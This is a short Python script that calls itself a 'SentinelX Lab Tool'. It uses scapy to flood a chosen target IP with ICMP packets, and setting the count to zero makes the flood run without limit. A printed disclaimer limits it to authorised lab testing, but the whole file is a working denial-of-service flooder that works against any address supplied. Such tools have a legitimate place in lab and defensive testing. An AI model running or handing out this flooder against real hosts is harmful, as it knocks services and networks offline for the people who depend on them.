import time
import argparse
from scapy.all import IP, ICMP, send

print("[!] WARNING: This script is for educational purposes and authorized lab testing only.")
print("[!] Do NOT run this on unauthorized networks.\n")

parser = argparse.ArgumentParser(description="SentinelX Lab Tool: ICMP Flood Generator")
parser.add_argument("--target", default="127.0.0.1", help="Target IP address")
parser.add_argument("--count", type=int, default=150, help="Number of packets to send")
parser.add_argument("--delay", type=float, default=0.01, help="Delay between packets")
args = parser.parse_args()

print(f"[*] Starting ICMP Flood against {args.target}")
if args.count == 0:
    print(f"[*] Sending packets indefinitely with {args.delay}s delay... (Press Ctrl+C to stop)")
else:
    print(f"[*] Sending {args.count} packets with {args.delay}s delay...")

try:
    packet = IP(dst=args.target)/ICMP()
    sent = 0
    while args.count == 0 or sent < args.count:
        send(packet, verbose=0)
        sent += 1
        if args.delay > 0:
            time.sleep(args.delay)
    print(f"\n[+] Attack simulation completed. Sent {sent} packets.")
except KeyboardInterrupt:
    print(f"\n[!] Attack aborted by user. Sent {sent} packets.")
except Exception as e:
    print(f"\n[!] Error: {e}")
